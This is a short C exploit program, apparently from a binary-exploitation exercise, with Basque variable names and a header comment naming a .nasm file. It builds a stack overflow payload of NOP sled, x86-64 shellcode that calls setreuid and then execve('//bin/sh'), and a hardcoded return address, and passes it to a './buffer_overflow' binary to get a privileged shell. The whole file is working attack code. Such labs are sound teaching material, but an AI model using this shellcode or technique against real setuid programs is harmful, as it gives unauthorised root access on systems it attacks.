/*
* execve_suid.nasm
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFFER_TAMAINA 64

int main() {
    char payload[BUFFER_TAMAINA + 16];
    memset(payload, 0x90, 8);
    // 54 byte
    unsigned char shellcode[] =
        "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\xb0\x6b\x0f\x05\x66\x89"
        "\xc7\x66\x89\xc6\x48\x31\xc0\xb0\x71\x0f\x05\x48\x31\xc0\x48"
        "\x31\xf6\x48\x31\xd2\xb0\x3b\x56\x48\xbf\x2f\x2f\x62\x69\x6e"
        "\x2f\x73\x68\x57\x48\x89\xe7\x0f\x05";

    memcpy(payload + 8, shellcode, sizeof(shellcode) - 1);
    memset(payload + 8 + sizeof(shellcode) - 1, 0x90, 10);

    void *ret_helbidea = (void *)0x7fffffffe1c0;
    memcpy(payload + BUFFER_TAMAINA + 8, &ret_helbidea, 8);

    char *args[] = {"./buffer_overflow", payload, NULL};
    execv(args[0], args);

    return 0;
}
